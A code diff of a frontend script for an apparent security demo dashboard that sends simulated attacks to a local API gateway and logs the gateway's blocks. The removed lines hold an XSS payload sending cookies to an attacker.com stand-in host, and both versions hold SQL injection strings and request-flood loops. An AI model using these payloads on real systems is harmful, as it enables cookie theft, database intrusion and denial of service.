@@ -1,178 +1,158 @@
-// Central Config Settings targeting our local edge gateway proxy routes
-const GATEWAY_BASE_URL = 'http://localhost:8000/v1/mobile';
-const MOCK_VALID_TOKEN = 'Bearer nexus_secure_token_abc123';
-const MOCK_DEVICE_ID = 'dev_iphone16_nexus_alpha';
+// Configuration Coordinates for the Central Edge Gateway Proxy Sub-System
+const GATEWAY_URL = 'http://localhost:8000/v1/mobile';
+const MOCK_DEVICE_ID = 'MOB-DEVICE-UUID-9921A';
+const MOCK_JWT_TOKEN = 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiJ1c2VyX21vYl85OTIxIiwicm9sZSI6Im1vYmlsZV9jbGllbnQifQ';
 
-// Reference UI Interface nodes
-const logFeedContainer = document.getElementById('log-feed-container');
-const walletBalance = document.getElementById('wallet-balance');
-const accountNumber = document.getElementById('acc-num');
-const authCidDisplay = document.getElementById('auth-cid');
-const hackerTerminal = document.getElementById('hacker-terminal');
+// DOM Interconnection Anchors
+const balanceDisplay = document.getElementById('balance-display');
+const clientStatusText = document.getElementById('client-status-text');
+const networkResponseBox = document.getElementById('network-response-box');
+const siemLogsContainer = document.getElementById('siem-logs-container');
 
-// UI Automation Helper to render live structured telemetry entries
-function pushTelemetryLog(status, message, correlationId = 'N/A') {
-    // Clear initial listening string placeholder if it's there
-    if (logFeedContainer.innerHTML.includes('[System Telemetry Framework Listening')) {
-        logFeedContainer.innerHTML = '';
+const btnFetchBalance = document.getElementById('btn-fetch-balance');
+const btnAttackRate = document.getElementById('btn-attack-rate');
+const btnAttackSqli = document.getElementById('btn-attack-sqli');
+
+// Helper Utility: Adds structured logs onto Screen 3 (SIEM Dashboard)
+// Replace ONLY the injectSIEMLog function inside frontend/app.js:
+function injectSIEMLog(type, message, status, correlationId) {
+    if (siemLogsContainer.querySelector('.placeholder-text')) {
+        siemLogsContainer.innerHTML = '';
     }
 
-    const logBlock = document.createElement('div');
-    logBlock.className = `p-2 rounded border border-slate-800 text-[10px] font-mono leading-tight ${
-        status === 'SUCCESS' ? 'bg-emerald-950/40 text-emerald-400 border-emerald-900/50' : 
-        status === 'ATTACK' ? 'bg-red-950/60 text-red-400 border-red-900/60 animate-pulse' : 
-        'bg-amber-950/40 text-amber-400 border-amber-900/50'
-    }`;
+    const timestamp = new Date().toLocaleTimeString();
+    const isSuccess = status >= 200 && status < 300;
+    
+    // Assign pure CSS explicit border accent variations
+    const borderStyle = isSuccess ? 'border-left: 3px solid var(--color-emerald);' : 'border-left: 3px solid var(--color-rose);';
 
-    logBlock.innerHTML = `
-        <div class="flex justify-between font-bold mb-0.5">
-            <span>[${status}] ${new Date().toLocaleTimeString()}</span>
-            <span class="text-slate-500">CID: ${correlationId.substring(0, 8)}...</span>
+    const logRow = document.createElement('div');
+    logRow.className = `log-entry animate-fadeIn`;
+    logRow.style = borderStyle;
+    logRow.innerHTML = `
+        <div style="display: flex; justify-content: space-between; align-items: center;">
+            <span style="font-weight: bold; color: ${isSuccess ? 'var(--color-emerald)' : 'var(--color-rose)'}">
+                HTTP ${status} [${type}]
+            </span>
+            <span style="color: var(--text-muted); font-size: 10px;">${timestamp}</span>
         </div>
-        <div>${message}</div>
+        <p style="color: #cbd5e1; margin-top: 2px;">${message}</p>
+        <div style="font-size: 10px; color: #475569; display: flex; justify-content: space-between; margin-top: 4px; border-top: 1px solid #1e293b; pt: 4px;">
+            <span>CID: ${correlationId || 'N/A'}</span>
+        </div>
     `;
     
-    logFeedContainer.prepend(logBlock);
+    siemLogsContainer.insertBefore(logRow, siemLogsContainer.firstChild);
+}
+
+// Helper Utility: Updates the raw code execution inspector box on Screen 2
+function updateInspector(status, data) {
+    networkResponseBox.className = status === 200 ? 'text-emerald-400 whitespace-pre-wrap' : 'text-rose-400 whitespace-pre-wrap';
+    networkResponseBox.innerText = `HTTP/1.1 ${status}\n` + JSON.stringify(data, null, 2);
 }
 
 // ==========================================
-// ACTION 1: TRIGGER SECURE PROFILE REFRESH
+// INTERACTION SYSTEM 1: STANDARD AUTHORIZED ACCESSIBILITY
 // ==========================================
-document.getElementById('btn-fetch-balance').addEventListener('click', async () => {
-    hackerTerminal.innerText = "Simulating legitimate mobile client traffic verification handshake...";
+btnFetchBalance.addEventListener('click', async () => {
+    clientStatusText.innerText = "Connecting to edge gateway proxy pipeline...";
     
     try {
-        const response = await fetch(`${GATEWAY_BASE_URL}/profile`, {
-            method: 'GET',
-            headers: {
-                'Authorization': MOCK_VALID_TOKEN,
-                'X-Device-ID': MOCK_DEVICE_ID
-            }
-        });
-
-        const jsonResult = await response.json();
-        
-        if (response.ok) {
-            walletBalance.innerText = jsonResult.data.availableBalance;
-            accountNumber.innerText = jsonResult.data.accountNumber;
-            authCidDisplay.innerText = jsonResult.correlationId.substring(0, 8);
-            hackerTerminal.innerText = "Secure Profile synchronization completed successfully.";
-            pushTelemetryLog('SUCCESS', `200 OK - Profile fetched safely from inner backend microservice core data schemas.`, jsonResult.correlationId);
-        } else {
-            throw new Error(jsonResult.error || 'Gateway validation rejection');
-        }
-    } catch (err) {
-        pushTelemetryLog('ERROR', `Fetch Interception Failure: ${err.message}`);
-    }
-});
-
-// ==========================================
-// ACTION 2: INJECT SQL INJECTION ATTACK VECTOR
-// ==========================================
-document.getElementById('btn-attack-sqli').addEventListener('click', async () => {
-    hackerTerminal.innerText = "Injecting dangerous payload data properties: { query: 'UNION SELECT' }...";
-    
-    try {
-        const response = await fetch(`${GATEWAY_BASE_URL}/profile`, {
-            method: 'POST', // Switching method context to transport threat properties inside body
-            headers: {
-                'Authorization': MOCK_VALID_TOKEN,
-                'X-Device-ID': MOCK_DEVICE_ID,
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({ injectionPayload: "admin' UNION SELECT username, password FROM users; --" })
-        });
-
-        const resData = await response.json();
-        hackerTerminal.innerText = `Exploit dropped by gateway network interface layer with error message: ${resData.error}`;
-        pushTelemetryLog('ATTACK', `400 BAD REQUEST - Deep payload threat inspection blocked SQL Injection string parameters!`, resData.cid);
-    } catch (err) {
-        console.error(err);
-    }
-});
-
-// ==========================================
-// ACTION 3: INJECT CROSS-SITE SCRIPTING EXPLOIT
-// ==========================================
-document.getElementById('btn-attack-xss').addEventListener('click', async () => {
-    hackerTerminal.innerText = "Injecting volatile scripts: <script>maliciousXss()</script>...";
-    
-    try {
-        const response = await fetch(`${GATEWAY_BASE_URL}/profile`, {
+        const response = await fetch(`${GATEWAY_URL}/account/balance`, {
             method: 'POST',
             headers: {
-                'Authorization': MOCK_VALID_TOKEN,
+                'Authorization': MOCK_JWT_TOKEN,
                 'X-Device-ID': MOCK_DEVICE_ID,
                 'Content-Type': 'application/json'
             },
-            body: JSON.stringify({ maliciousScript: "<script>window.location='http://attacker.com' + document.cookie</script>" })
+            body: JSON.stringify({ action: "read_balance" })
         });
 
-        const resData = await response.json();
-        hackerTerminal.innerText = `Exploit dropped by gateway firewall checks with message context: ${resData.error}`;
-        pushTelemetryLog('ATTACK', `400 BAD REQUEST - Deep payload threat inspection matched XSS script tag components!`, resData.cid);
-    } catch (err) {
-        console.error(err);
+        const data = await response.json();
+        updateInspector(response.status, data);
+
+        if (response.ok) {
+            balanceDisplay.innerText = `$${data.balance.toLocaleString(undefined, {minimumFractionDigits: 2})}`;
+            balanceDisplay.className = "text-3xl font-extrabold text-emerald-400 mt-1";
+            clientStatusText.innerText = "Data updated securely via internal proxy connection channels.";
+            injectSIEMLog('FETCH', 'Authorized query executed successfully.', response.status, data.cid);
+        } else {
+            throw new Error(data.error || 'Gateway Rejected Request');
+        }
+    } catch (error) {
+        balanceDisplay.innerText = "\$*,***.**";
+        balanceDisplay.className = "text-3xl font-extrabold text-rose-500 mt-1";
+        clientStatusText.innerText = `Connection Terminated: ${error.message}`;
+        injectSIEMLog('BLOCKED', error.message, 401, 'N/A');
     }
 });
 
 // ==========================================
-// ACTION 4: BURST ATTACK RATE LIMIT CONSTRAINTS
+// INTERACTION SYSTEM 2: RATE LIMIT EXPLOIT ATTACK
 // ==========================================
-document.getElementById('btn-attack-rate').addEventListener('click', async () => {
-    hackerTerminal.innerText = "Launching automated high-frequency volumetric burst scripting sequences...";
+btnAttackRate.addEventListener('click', async () => {
+    btnAttackRate.disabled = true;
+    btnAttackRate.innerText = "Firing Concurrent Attacks (120 Requests)...";
     
-    // Low loop to trip our Redis traffic monitor instantly
-    for (let i = 1; i <= 15; i++) {
-        setTimeout(async () => {
-            try {
-                const response = await fetch(`${GATEWAY_BASE_URL}/profile`, {
-                    method: 'GET',
-                    headers: {
-                        'Authorization': MOCK_VALID_TOKEN,
-                        'X-Device-ID': MOCK_DEVICE_ID
-                    }
-                });
+    let blockedCaught = false;
+    let lastStatus = 200;
+    let lastData = {};
 
-                const resData = await response.json();
-                
-                if (response.status === 429) {
-                    hackerTerminal.innerText = `Volumetric request script number ${i} was blocked explicitly: ${resData.error}`;
-                    pushTelemetryLog('ATTACK', `429 TOO MANY REQUESTS - High speed traffic count tripped the Redis cache counter profile!`, resData.cid);
-                } else {
-                    pushTelemetryLog('SUCCESS', `Request execution count #${i} passed validation constraints successfully.`, resData.correlationId);
-                }
-            } catch (err) {
-                console.error(err);
-            }
-        }, i * 150); // Small execution delay spacing to create realistic traffic streaming lookups
-    }
-});
-
-// ==========================================
-// ACTION 5: CRYPTOGRAPHIC AUTHENTICATION BYPASS
-// ==========================================
-document.getElementById('btn-attack-auth').addEventListener('click', async () => {
-    hackerTerminal.innerText = "Transmitting corrupted authorization strings to test zero-trust validations...";
-    
-    try {
-        const response = await fetch(`${GATEWAY_BASE_URL}/profile`, {
-            method: 'GET',
+    // Simulate high-volume micro-burst concurrency looping patterns
+    for (let i = 0; i < 120; i++) {
+        fetch(`${GATEWAY_URL}/account/balance`, {
+            method: 'POST',
             headers: {
-                'Authorization': 'Bearer corrupted_token_signature_xyz_789',
-                'X-Device-ID': MOCK_DEVICE_ID
+                'Authorization': MOCK_JWT_TOKEN,
+                'X-Device-ID': MOCK_DEVICE_ID,
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ action: "read_balance" })
+        }).then(async (res) => {
+            const parsed = await res.json();
+            if (res.status === 429 && !blockedCaught) {
+                blockedCaught = true;
+                updateInspector(res.status, parsed);
+                injectSIEMLog('DOS_BLOCK', 'Redis Sliding Window tripped. Rate limiter dropped threat.', res.status, parsed.cid);
             }
-        });
-
-        const resData = await response.json();
-        hackerTerminal.innerText = `Gateway authentication layer dropped request with error parameters: ${resData.error}`;
-        pushTelemetryLog('ERROR', `401 UNAUTHORIZED - Cryptographic check failed. Token signature validation failed.`, resData.cid);
-    } catch (err) {
-        console.error(err);
+        }).catch(() => {});
     }
+
+    // Restore interface controls after execution sequence
+    setTimeout(() => {
+        btnAttackRate.disabled = false;
+        btnAttackRate.innerText = "Launch Automated Rate Attack";
+    }, 2000);
 });
 
-// Clean the interface log feed tracking console array
-document.getElementById('btn-clear-logs').addEventListener('click', () => {
-    logFeedContainer.innerHTML = '<div class="text-slate-500 italic text-center pt-20">[Log screen wiped clean]</div>';
+// ==========================================
+// INTERACTION SYSTEM 3: SQL INJECTION (SQLi) EXPLOIT ATTACK
+// ==========================================
+btnAttackSqli.addEventListener('click', async () => {
+    try {
+        const response = await fetch(`${GATEWAY_URL}/account/balance`, {
+            method: 'POST',
+            headers: {
+                'Authorization': MOCK_JWT_TOKEN,
+                'X-Device-ID': MOCK_DEVICE_ID,
+                'Content-Type': 'application/json'
+            },
+            // Malicious application string injected within core structural field payloads
+            body: JSON.stringify({ 
+                action: "read_balance",
+                accountQuery: "SELECT * FROM accounts WHERE id = '9921' UNION SELECT credit_card, cvv FROM master_vault; --" 
+            })
+        });
+
+        const data = await response.json();
+        updateInspector(response.status, data);
+
+        if (response.status === 400) {
+            injectSIEMLog('SQLI_BLOCK', 'Regex Match: Dropped payload containing injection vectors.', response.status, data.cid);
+        } else {
+            injectSIEMLog('VULN_EXPOSED', 'Exploit payload bypass confirmed.', response.status, data.cid);
+        }
+    } catch (error) {
+        console.error("Network interface error:", error);
+    }
 });
